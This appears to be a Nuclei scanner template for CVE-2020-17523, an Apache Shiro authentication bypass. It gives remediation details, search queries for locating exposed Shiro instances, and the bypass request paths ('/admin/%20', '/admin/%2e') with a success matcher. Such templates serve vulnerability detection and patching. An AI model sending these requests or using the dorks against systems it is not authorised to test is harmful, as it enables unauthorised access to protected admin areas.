id: CVE-2020-17523

info:
  name: Apache Shiro Authentication Bypass
  author: ProjectDiscoveryAI
  severity: critical
  description: Apache Shiro before 1.7.1, when using Apache Shiro with Spring, a specially crafted HTTP request may cause an authentication bypass.
  impact: |
    Successful exploitation could allow attackers to bypass authentication controls.
  remediation: |
    Upgrade to Apache Shiro version 1.7.1 or later to mitigate the vulnerability.
  reference:
    - https://github.com/jweny/shiro-cve-2020-17523
    - https://github.com/apache/shiro/commit/0842c27fa72d0da5de0c5723a66d402fe20903df
    - https://www.anquanke.com/post/id/216096
    - https://www.cnblogs.com/syp172654682/p/9257282.html
    - https://lists.apache.org/thread.html/r5b93ddf97e2c4cda779d22fab30539bdec454cfa5baec4ad0ffae235%40%3Cgitbox.activemq.apache.org%3E
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-17523
    cwe-id: CWE-287
    epss-score: 0.36015
    epss-percentile: 0.97273
    cpe: cpe:2.3:a:apache:shiro:*:*:*:*:*:*:*:*
  metadata:
    vendor: apache
    product: shiro
    shodan-query: http.title:"apache shiro quickstart"
    fofa-query: title="apache shiro quickstart"
    google-query: intitle:"apache shiro quickstart"

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/%20"
      - "{{BaseURL}}/admin/%20/"
      - "{{BaseURL}}/admin/%2e"
      - "{{BaseURL}}/admin/%2e/"

    matchers:
      - type: status
        status:
          - 200
